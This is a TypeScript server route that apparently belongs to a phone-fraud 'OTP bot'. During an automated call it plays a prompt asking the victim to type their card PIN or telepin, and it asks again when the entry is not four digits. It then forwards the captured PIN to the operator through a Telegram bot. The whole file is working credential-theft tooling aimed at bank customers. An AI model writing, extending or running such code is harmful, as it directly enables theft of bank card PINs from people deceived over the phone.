import { bot } from '../..';
import { app } from '../';
import { v4 as uuidv4 } from 'uuid';
import { getLangPin } from '../../languages';
import { Language } from '../../types';

app.all('/calls/pin/:chatId/:language', async (req, res) => {
  const { chatId, language } = req.params;
  const { variables } = req.query;
  const { dtmf } = JSON.parse(variables as string);

  // const { pinType } = req.query;

  if (!dtmf) {
    return res.json({
      id: uuidv4(),
      title: `call PIN STEP - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangPin({
              step: `1`,
              language: language as Language,
            }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
          },
        },
      ],
    });
  }

  if (dtmf) {
    if (dtmf.length !== 4) {
      return res.json({
        id: uuidv4(),
        title: `call PIN STEP - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              payload: getLangPin({
                step: `2`,
                language: language as Language,
              }),
              language,
              voice: 'female',
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'nextStepGoto',
            onKeypressVar: 'dtmf',
            endKey: '#',
            maxNumKeys: 8,
          },
          {
            id: 'nextStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
            },
          },
        ],
      });
    }

    await bot.telegram.sendMessage(
      req.params.chatId,
      req.params.language === 'en-us'
        ? `Card Pin is <b>${dtmf}</b> 💳`
        : `Telepin is <b>${dtmf}</b> 📟`,
      {
        parse_mode: 'HTML',
      },
    );
  }

  return res.json({
    id: uuidv4(),
    title: `call bank - ${chatId} no OTP`,
    record: false,
    steps: [
      {
        id: uuidv4(),
        action: 'say',
        options: {
          payload: getLangPin({
            step: `3`,
            language: language as Language,
            dtmf: dtmf.split('').join(', '),
          }),
          language,
          voice: 'female',
        },
      },
    ],
  });
});
